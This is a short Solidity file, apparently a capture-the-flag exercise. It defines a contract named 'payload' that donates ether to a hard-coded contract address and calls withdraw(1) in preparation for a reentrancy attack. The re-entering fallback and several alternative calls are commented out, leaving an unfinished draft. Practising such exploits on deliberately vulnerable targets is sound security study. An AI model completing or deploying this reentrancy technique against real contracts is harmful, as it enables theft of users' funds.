// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Reentrance {
    function withdraw(uint256 _amount) public {}
}

contract payload {
    uint256 value;
    Reentrance r;

    function pwn() public payable {
        address payable target = 0x37Ca3e828cc2Fb51244119c65aF1269209e7f69B;
        bytes memory payload = abi.encodeWithSignature(
            "donate(address)",
            address(this)
        );
        (bool success, bytes memory returnData) = address(target).call{
            value: msg.value,
            gas: 400000
        }(payload);
        //require(success);
        //target.call.gas(1000000).value(msg.value)("donate", address(this));
        //reentrance.donate.value(msg.value)(address(this));
        r = Reentrance(target);
        r.withdraw(1);
        //bytes memory withdraw = abi.encodeWithSignature("withdraw(uint)", 1);
        //(bool success2, bytes memory returnData2) = address(target).call{gas: 400000}(withdraw);
        //reentrance.withdraw(value);
        //(bool result, ) = target.call{value: msg.value}("");
    }

    fallback() external {
        /*
        address payable target = 0x37Ca3e828cc2Fb51244119c65aF1269209e7f69B;
        bytes memory payload2 = abi.encodeWithSignature(
            "withdraw(uint)",
            value
        );
        (bool success2, bytes memory returnData2) = address(target).call(
            payload2
        );
        */
    }
}